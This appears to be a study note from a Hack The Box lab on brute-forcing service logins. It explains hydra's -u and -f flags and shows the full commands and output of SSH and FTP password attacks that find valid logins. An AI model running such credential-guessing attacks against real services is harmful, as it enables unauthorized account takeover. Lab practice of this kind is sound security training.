---
title: f-Service Authentication Bruteforce
draft: false
tags: []
---
## SSH Attack

- **`-u`**: This flag tells `hydra` to attempt **only one password per user at a time**. Without this flag, `hydra` will try all passwords for one user before moving on to the next user in the list.
    
- **`-f`**: This flag **stops the attack as soon as the first valid password is found**. Without this flag, `hydra` would continue trying all combinations even after finding a valid password.

```shell-session
jadu101@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
[DATA] attacking ssh://178.35.49.134:22/
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

## FTP Attack

```shell-session
b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/

[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

